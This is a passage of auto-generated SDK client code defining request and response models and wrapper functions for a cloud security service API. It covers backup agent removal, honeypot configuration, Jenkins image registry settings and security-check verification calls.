model UninstallUniBackupAgentRequest {
  policyId?: long(name='PolicyId', example='123'),
}

model UninstallUniBackupAgentResponseBody = {
  requestId?: string(name='RequestId', example='9D97AFC3-AA58-5B8F-BBC4-16D7D8AB****'),
}

model UninstallUniBackupAgentResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UninstallUniBackupAgentResponseBody(name='body'),
}

async function uninstallUniBackupAgentWithOptions(request: UninstallUniBackupAgentRequest, runtime: Util.RuntimeOptions): UninstallUniBackupAgentResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UninstallUniBackupAgent',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function uninstallUniBackupAgent(request: UninstallUniBackupAgentRequest): UninstallUniBackupAgentResponse {
  var runtime = new Util.RuntimeOptions{};
  return uninstallUniBackupAgentWithOptions(request, runtime);
}

model UpdateHoneypotRequest {
  honeypotId?: string(name='HoneypotId'),
  honeypotName?: string(name='HoneypotName'),
  meta?: string(name='Meta'),
}

model UpdateHoneypotResponseBody = {
  code?: string(name='Code'),
  data?: {
    honeypotId?: string(name='HoneypotId'),
    honeypotImageDisplayName?: string(name='HoneypotImageDisplayName'),
    honeypotImageName?: string(name='HoneypotImageName'),
    honeypotName?: string(name='HoneypotName'),
    nodeId?: string(name='NodeId'),
    presetId?: string(name='PresetId'),
    state?: [ string ](name='State'),
  }(name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model UpdateHoneypotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateHoneypotResponseBody(name='body'),
}

async function updateHoneypotWithOptions(request: UpdateHoneypotRequest, runtime: Util.RuntimeOptions): UpdateHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotId)) {
    query['HoneypotId'] = request.honeypotId;
  }
  if (!Util.isUnset(request.honeypotName)) {
    query['HoneypotName'] = request.honeypotName;
  }
  if (!Util.isUnset(request.meta)) {
    query['Meta'] = request.meta;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function updateHoneypot(request: UpdateHoneypotRequest): UpdateHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateHoneypotWithOptions(request, runtime);
}

model UpdateHoneypotNodeRequest {
  availableProbeNum?: int32(name='AvailableProbeNum', example='20'),
  nodeId?: string(name='NodeId', example='67ab3f4c-3db5-4fc3-b51f-00f8bfabfa08'),
  nodeName?: string(name='NodeName'),
  securityGroupProbeIpList?: [ string ](name='SecurityGroupProbeIpList'),
}

model UpdateHoneypotNodeResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model UpdateHoneypotNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateHoneypotNodeResponseBody(name='body'),
}

async function updateHoneypotNodeWithOptions(request: UpdateHoneypotNodeRequest, runtime: Util.RuntimeOptions): UpdateHoneypotNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.availableProbeNum)) {
    query['AvailableProbeNum'] = request.availableProbeNum;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.nodeName)) {
    query['NodeName'] = request.nodeName;
  }
  if (!Util.isUnset(request.securityGroupProbeIpList)) {
    query['SecurityGroupProbeIpList'] = request.securityGroupProbeIpList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateHoneypotNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function updateHoneypotNode(request: UpdateHoneypotNodeRequest): UpdateHoneypotNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateHoneypotNodeWithOptions(request, runtime);
}

model UpdateHoneypotPresetRequest {
  honeypotImageName?: string(name='HoneypotImageName', example='metabase'),
  honeypotPresetId?: string(name='HoneypotPresetId', example='f75eddce-e9d3-4a88-af95-b10b6f656fda'),
  meta?: string(name='Meta', example='{\\"portrait_option\\":true,\\"burp\\":\\"open\\"}'),
  presetName?: string(name='PresetName', example='apc_web_python'),
}

model UpdateHoneypotPresetResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model UpdateHoneypotPresetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateHoneypotPresetResponseBody(name='body'),
}

async function updateHoneypotPresetWithOptions(request: UpdateHoneypotPresetRequest, runtime: Util.RuntimeOptions): UpdateHoneypotPresetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotImageName)) {
    query['HoneypotImageName'] = request.honeypotImageName;
  }
  if (!Util.isUnset(request.honeypotPresetId)) {
    query['HoneypotPresetId'] = request.honeypotPresetId;
  }
  if (!Util.isUnset(request.meta)) {
    query['Meta'] = request.meta;
  }
  if (!Util.isUnset(request.presetName)) {
    query['PresetName'] = request.presetName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateHoneypotPreset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function updateHoneypotPreset(request: UpdateHoneypotPresetRequest): UpdateHoneypotPresetResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateHoneypotPresetWithOptions(request, runtime);
}

model UpdateHoneypotProbeRequest {
  arp?: boolean(name='Arp', example='false'),
  displayName?: string(name='DisplayName', example='svwsx-vpc-4430'),
  ping?: boolean(name='Ping', example='true'),
  probeId?: string(name='ProbeId', example='bbe7e382-956f-473e-beed-bc73a2587900'),
  serviceIpList?: [ string ](name='ServiceIpList'),
}

model UpdateHoneypotProbeResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model UpdateHoneypotProbeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateHoneypotProbeResponseBody(name='body'),
}

async function updateHoneypotProbeWithOptions(request: UpdateHoneypotProbeRequest, runtime: Util.RuntimeOptions): UpdateHoneypotProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.arp)) {
    query['Arp'] = request.arp;
  }
  if (!Util.isUnset(request.displayName)) {
    query['DisplayName'] = request.displayName;
  }
  if (!Util.isUnset(request.ping)) {
    query['Ping'] = request.ping;
  }
  if (!Util.isUnset(request.probeId)) {
    query['ProbeId'] = request.probeId;
  }
  if (!Util.isUnset(request.serviceIpList)) {
    query['ServiceIpList'] = request.serviceIpList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateHoneypotProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function updateHoneypotProbe(request: UpdateHoneypotProbeRequest): UpdateHoneypotProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateHoneypotProbeWithOptions(request, runtime);
}

model UpdateJenkinsImageRegistryNameRequest {
  registryId?: long(name='RegistryId', example='25090'),
  registryName?: string(name='RegistryName', example='a0603tk1'),
  sourceIp?: string(name='SourceIp', example='121.33.XXX.XXX'),
}

model UpdateJenkinsImageRegistryNameResponseBody = {
  data?: boolean(name='Data', example='true'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  requestId?: string(name='RequestId', example='4347E985-6E64-467B-96EC-30D4EA9E****'),
  timeCost?: long(name='TimeCost', example='1'),
}

model UpdateJenkinsImageRegistryNameResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateJenkinsImageRegistryNameResponseBody(name='body'),
}

async function updateJenkinsImageRegistryNameWithOptions(request: UpdateJenkinsImageRegistryNameRequest, runtime: Util.RuntimeOptions): UpdateJenkinsImageRegistryNameResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.registryId)) {
    body['RegistryId'] = request.registryId;
  }
  if (!Util.isUnset(request.registryName)) {
    body['RegistryName'] = request.registryName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'UpdateJenkinsImageRegistryName',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function updateJenkinsImageRegistryName(request: UpdateJenkinsImageRegistryNameRequest): UpdateJenkinsImageRegistryNameResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateJenkinsImageRegistryNameWithOptions(request, runtime);
}

model UpdateJenkinsImageRegistryPersistenceDayRequest {
  persistenceDay?: int32(name='PersistenceDay', example='30'),
  registryId?: long(name='RegistryId', example='25363'),
  sourceIp?: string(name='SourceIp', example='106.11.XXX.XXX'),
}

model UpdateJenkinsImageRegistryPersistenceDayResponseBody = {
  data?: boolean(name='Data', example='true'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  requestId?: string(name='RequestId', example='69F88BA1-004C-51E2-BF5C-A3220E5A****'),
  timeCost?: long(name='TimeCost', example='1'),
}

model UpdateJenkinsImageRegistryPersistenceDayResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateJenkinsImageRegistryPersistenceDayResponseBody(name='body'),
}

async function updateJenkinsImageRegistryPersistenceDayWithOptions(request: UpdateJenkinsImageRegistryPersistenceDayRequest, runtime: Util.RuntimeOptions): UpdateJenkinsImageRegistryPersistenceDayResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.persistenceDay)) {
    body['PersistenceDay'] = request.persistenceDay;
  }
  if (!Util.isUnset(request.registryId)) {
    body['RegistryId'] = request.registryId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'UpdateJenkinsImageRegistryPersistenceDay',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function updateJenkinsImageRegistryPersistenceDay(request: UpdateJenkinsImageRegistryPersistenceDayRequest): UpdateJenkinsImageRegistryPersistenceDayResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateJenkinsImageRegistryPersistenceDayWithOptions(request, runtime);
}

model UpgradeBackupPolicyVersionRequest {
  id?: long(name='Id'),
}

model UpgradeBackupPolicyVersionResponseBody = {
  requestId?: string(name='RequestId'),
}

model UpgradeBackupPolicyVersionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpgradeBackupPolicyVersionResponseBody(name='body'),
}

async function upgradeBackupPolicyVersionWithOptions(request: UpgradeBackupPolicyVersionRequest, runtime: Util.RuntimeOptions): UpgradeBackupPolicyVersionResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpgradeBackupPolicyVersion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function upgradeBackupPolicyVersion(request: UpgradeBackupPolicyVersionRequest): UpgradeBackupPolicyVersionResponse {
  var runtime = new Util.RuntimeOptions{};
  return upgradeBackupPolicyVersionWithOptions(request, runtime);
}

model ValidateHcWarningsRequest {
  riskIds?: string(name='RiskIds', description='The IDs of risk items that you want to verify. Separate multiple IDs with commas (,).', example='43'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.3.4'),
  uuids?: string(name='Uuids', description='The UUIDs of servers on which you want to verify risk items.', example='78645c8e-2e89-441b-8eb,a9622a6b-adb5-4dd3-929e,0136460a-1cb5-44e8-****'),
}

model ValidateHcWarningsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='722C4F88-7867-4E7B-8ADE-7451053'),
}

model ValidateHcWarningsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ValidateHcWarningsResponseBody(name='body'),
}

async function validateHcWarningsWithOptions(request: ValidateHcWarningsRequest, runtime: Util.RuntimeOptions): ValidateHcWarningsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.riskIds)) {
    query['RiskIds'] = request.riskIds;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ValidateHcWarnings',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function validateHcWarnings(request: ValidateHcWarningsRequest): ValidateHcWarningsResponse {
  var runtime = new Util.RuntimeOptions{};
  return validateHcWarningsWithOptions(request, runtime);
}

model VerifyCheckInstanceResultRequest {
  checkId?: long(name='CheckId'),
  instanceIds?: [ string ](name='InstanceIds'),
}

model VerifyCheckInstanceResultResponseBody = {
  data?: {
    failInstances?: [ string ](name='FailInstances'),
    operateCode?: string(name='OperateCode'),
  }(name='Data'),
  requestId?: string(name='RequestId'),
}

model VerifyCheckInstanceResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: VerifyCheckInstanceResultResponseBody(name='body'),
}

async function verifyCheckInstanceResultWithOptions(request: VerifyCheckInstanceResultRequest, runtime: Util.RuntimeOptions): VerifyCheckInstanceResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'VerifyCheckInstanceResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function verifyCheckInstanceResult(request: VerifyCheckInstanceResultRequest): VerifyCheckInstanceResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return verifyCheckInstanceResultWithOptions(request, runtime);
}

model VerifyCheckResultRequest {
  checkIds?: [ long ](name='CheckIds'),
}

model VerifyCheckResultResponseBody = {
  data?: {
    operateCode?: string(name='OperateCode', example='Throttling'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='7C0A3FA0-AA32-5660-8989-85A5582F****'),
}

model VerifyCheckResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: VerifyCheckResultResponseBody(name='body'),
}

async function verifyCheckResultWithOptions(request: VerifyCheckResultRequest, runtime: Util.RuntimeOptions): VerifyCheckResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'VerifyCheckResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function verifyCheckResult(request: VerifyCheckResultRequest): VerifyCheckResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return verifyCheckResultWithOptions(request, runtime);
}

